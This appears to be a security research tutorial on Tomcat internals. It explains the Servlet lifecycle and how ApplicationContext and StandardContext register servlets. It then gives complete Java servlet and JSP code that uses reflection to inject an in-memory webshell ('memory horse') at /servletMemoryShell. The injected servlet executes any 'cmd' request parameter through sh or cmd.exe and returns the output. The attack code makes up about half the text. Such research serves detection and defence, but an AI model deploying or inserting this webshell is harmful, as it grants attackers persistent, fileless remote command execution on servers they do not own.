# Java Security Of Tomcat Servlet

## Preparation

​ In the `Tomcat` architecture, the life cycle of `Servlet` is divided into five parts:

- Loading phase: When `Tomcat` first access to `Servlet`, an instance of `Servlet` is created.
- Initialization phase: When `Servlet` is instantiated, `Tomcat` will call the `init` method to initialize this object.
- Processing service phase: When the browser accesses `Servlet`, `Servlet` will call the `service` method to handle the request.
- Destruction phase: When `Tomcat` is closed or when `Servlet` is detected to be deleted from `Tomcat`, the `destroy` method will be automatically called to allow the instance to release the resources occupied. In addition, if a Servlet is not used for a long time, it will also be automatically destroyed by `Tomcat`.
- Uninstallation stage: When the `Servlet` calls the `destroy` method, it will wait for garbage collection. If you need to use this Servlet again, the `init` method will be called again for initialization.

```java
public interface Servlet {
	// Called by the servlet container to indicate to the servlet that the servlet is being put into service.
	// After instantiating the servlet, the servlet container calls the init method exactly once. The init method must be completed successfully before the servlet can receive any request.
	// If the init method occurs the following situation, the servlet container cannot put the servlet into the service
	// Throw a ServletException
	// No return within the time period defined by the web server
	public void init(ServletConfig config) throws ServletException;

	// Returns a ServletConfig object containing the initialization and startup parameters of the Servlet. The returned ServletConfig object is the object passed to the init method.
	// The implementation of this interface is responsible for storing the ServletConfig object so that this method can return it. The GenericServlet class that implements this interface has done this.
	public ServletConfig getServletConfig();

	// Called by the servlet container, allowing the servlet to respond to the request.
	// This method will only be called after the servlet's init() method is successfully completed.
	// For servlets that throw or send errors, the status code of the response should always be set.
	// Servlets are usually run in multi-threaded Servlet containers and can handle multiple requests at the same time. Developers must take care to synchronous access to any shared resources, such as files, network connections, and servlet class and instance variables. More information about multi-threaded programming in Java can be found in the Java multi-threaded programming tutorial.
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException;

	// Returns information about Servlets such as author, version and copyright.
	// The string returned by this method should be plain text, not any form of tags (such as HTML, XML, etc.).
    public String getServletInfo();

    // Called by the servlet container to indicate to the servlet that the servlet will be exited from the service. This method will only be called after all threads in the servlet's service method exit, or after the timeout has expired. After the servlet container calls the method, it will no longer call the servlet's service method.
    // This method gives the servlet a chance to clean up any reserved resources (e.g., memory, file handles, threads) and ensure that any persistent state is synchronized with the current state of the servlet in memory.
    public void destroy();
}
```

## Process Analysis

​ Similar to the `Filter` memory horse, the `addServlet` and `createServlet` methods also exist in the `javax.servlet.ServletContext`.

![](img/1.png)

Follow up on the implementation method of `addServlet`` org.apache.catalina.core.ApplicationContext#addServlet`. In this method, first detect the incoming `servletName`, and an exception will be thrown when it is empty. Then judge the life cycle of `context`. If it is in the `LifecycleState.STARTING_PREP` state, an exception will also be thrown. Then search for the associated subcontainer from the context through `servletName` and convert it into a `Wrapper` object. When it does not exist, a `wrapper` with the name `servletName` will be created, and then the created `wrapper` will be added to the `context` subcontainer. Finally, determine whether `servlet` is `null`. When `servlet == null`, the passed `servletClass` will be set into `wrapper`. Finally, call the `org.apache.catalina.core.StandardContext#dynamicServletAdded` method for `servlet` dynamic loading.

![](img/2.png)

Follow up on the `org.apache.catalina.core.StandardContext#dynamicServletAdded` method and instantiate an `ApplicationServletRegistration` object.

![](img/3.png)

![](img/4.png)

​ In the `org.apache.catalina.core.StandardContext#startInternal` method, it is noted that in the `loadOnStartup` method called when `servlet` is constructed, the value of `loadOnStartup` will be obtained. At this time, only if the value of `loadOnStartup` is greater than `0`, the `wrapper` will be loaded.

![](img/5.png)

## Achievement

### Idea

​ The specific ideas for dynamically injecting `Servlet` memory horse are as follows:

1. Call `StandardContext.createWrapper` to create a `wrapper` for `servlet`;
2. Configure the `LoadOnStartup` startup priority;
3. Configure `ServletName`;
4. Configure `ServletClass`;
5. Add `wrapper` to `Context` in `addChild`;
6. Add a mapping in `addServletMapping`.

### Dynamic Registration

#### Servlet

```java
package servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet(name = "ServletMemoryShellServlet", value = "/ServletMemoryShellServlet")
public class ServletMemoryShellServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        super.doGet(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            ServletContext servletContext = request.getSession().getServletContext();
            Field context = servletContext.getClass().getDeclaredField("context");
            context.setAccessible
(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
            Field context1 = applicationContext.getClass().getDeclaredField("context");
            context1.setAccessible(true);
            StandardContext standardContext = (StandardContext) context1.get(applicationContext);

            String servletMapping = standardContext.findServletMapping("servletMemoryShell");
            if (servletMapping != null) {
                return;
            }

            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName("servletMemoryShell");
            Servlet servletMemoryShell = new Servlet() {
                public void init(ServletConfig servletConfig) {
                }

                public ServletConfig getServletConfig() {
                    return null;
                }

                public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
                    HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                    HttpServletResponse httpServletResponse = (HttpServletResponse) servletResponse;

                    if (httpServletRequest.getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osType = System.getProperty("os.name");
                        if (osType != null && osType.toLowerCase().contains("win")) {
                            isLinux = false;
                        }

                        String[] command = isLinux ? new String[]{"sh", "-c", httpServletRequest.getParameter("cmd")} : new String[]{"cmd.exe", "/c", httpServletRequest.getParameter("cmd")};
                        InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                        Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                        String output = scanner.hasNext() ? scanner.next() : "";
                        httpServletResponse.getWriter().write(output);
                        httpServletResponse.getWriter().flush();
                    }
                }

                public String getServletInfo() {
                    return null;
                }

                public void destroy() {
                }
            };
            wrapper.setLoadOnStartup(1);
            wrapper.setServlet(servletMemoryShell);
            wrapper.setServletClass(servletMemoryShell.getClass().getName());

            standardContext.addChild(wrapper);
            standardContext.addServletMapping("/servletMemoryShell", "servletMemoryShell");

            response.getWriter().write("Servlet Inject Successfully...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/6.png)

#### JSP

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field context = servletContext.getClass().getDeclaredField("context");
    context.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
    Field context1 = applicationContext.getClass().getDeclaredField("context");
    context1.setAccessible(true);
    StandardContext standardContext = (StandardContext) context1.get(applicationContext);

    String servletMapping = standardContext.findServletMapping("servletMemoryShell");
    if (servletMapping != null) {
        return;
    }

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("servletM
emoryShell");
    Servlet servletMemoryShell = new Servlet() {
        public void init(ServletConfig servletConfig) {
        }

        public ServletConfig getServletConfig() {
            return null;
        }

        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            HttpServletResponse httpServletResponse = (HttpServletResponse) servletResponse;

            if (httpServletRequest.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }

                String[] command = isLinux ? new String[]{"sh", "-c", httpServletRequest.getParameter("cmd")} : new String[]{"cmd.exe", "/c", httpServletRequest.getParameter("cmd")};
                InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                String output = scanner.hasNext() ? scanner.next() : "";
                httpServletResponse.getWriter().write(output);
                httpServletResponse.getWriter().flush();
            }
        }

        public String getServletInfo() {
            return null;
        }

        public void destroy() {
        }
    };
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servletMemoryShell);
    wrapper.setServletClass(servletMemoryShell.getClass().getName());

    standardContext.addChild(wrapper);
    standardContext.addServletMapping("/servletMemoryShell", "servletMemoryShell");

    response.getWriter().write("Servlet Inject Successfully...");
%>
```

![](img/7.png)